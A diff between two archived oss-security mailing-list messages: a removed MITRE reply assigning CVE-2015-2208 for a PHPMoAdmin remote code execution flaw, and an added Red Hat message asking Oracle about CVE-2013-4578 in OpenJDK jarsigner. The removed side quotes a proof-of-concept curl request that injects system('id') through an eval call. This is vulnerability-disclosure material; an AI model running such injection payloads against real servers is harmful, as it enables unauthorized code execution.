@@ -1,40 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/03/04/5
-Message-Id: <20150304093144.7D1C96C000A@smtpvmsrv1.mitre.org>
-Date: Wed,  4 Mar 2015 04:31:44 -0500 (EST)
-From: cve-assign@...re.org
-To: henri@...v.fi
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request: PHPMoAdmin Unauthorized Remote Code Execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/08/6
+Message-ID: <54D7E536.3060608@redhat.com>
+Date: Sun, 08 Feb 2015 15:37:42 -0700
+From: Kurt Seifried <kseifried@...hat.com>
+To: security@...cle.com, "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2013-4578 OpenJDK: jarsigner does not detect unsigned bytecode injected into signed jars
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+CVE-2013-4578 OpenJDK: jarsigner does not detect unsigned bytecode
+injected into signed jars
 
-> Can you assign 2015 CVE identifier for unauthorized remote code execution
-> vulnerability in PHPMoAdmin <http://www.phpmoadmin.com/>
+https://bugzilla.redhat.com/show_bug.cgi?id=1031471
 
-> curl "http://example.com/moadmin.php"; -d "object=1;system('id');exit"
+Fixed upstream in OpenJDK:
 
-> http://seclists.org/fulldisclosure/2015/Mar/19
+http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/d5f36e1c927e
 
-> 693:    eval('$obj=' . $obj . ';'); //cast from string to array
+Also reportedly fixed in Oracle Java in CPU Jan 2014
 
-Use CVE-2015-2208.
+http://www.oracle.com/technetwork/topics/security/cpujan2014-1972949.html
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+But I don't see the CVE. Oracle can you confirm if this was fixed, and
+which CVE it was given? Thanks.
 
-iQEcBAEBAgAGBQJU9tCnAAoJEKllVAevmvmsA+oH/A1WfaSkqOcFeboeuhy1nhPS
-AwbQrbTIocKxnvLTuG4EbD61zkaFI7hND63BLGEih4GIaI1xlf9X3EL8EmYPSoY8
-U8VKpEtJAVQzFWHYobxdKu71WHBGjM0GpF4ckH3XacbkVsluJRoh3BnwCrMZatjn
-DI21LBR7tN01x2zqxIEqtVrNsv8ml9P2TLIMlTfMcVTnfCEtrmrcTx+TrWUbHofO
-aHBvUOy85Dmm0SQXn3E9z1Nfa7IkpwthrlAANfUp04X15uVV5bbSlv+zjVD9XAtu
-UPVYa98JZiZgKp5q7Q/8udG8carcs6uwOmjHqySVxPeVjXWArSDGD1KZhCqVH9k=
-=o9Yr
------END PGP SIGNATURE-----
+-- 
+Kurt Seifried -- Red Hat -- Product Security -- Cloud
+PGP A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
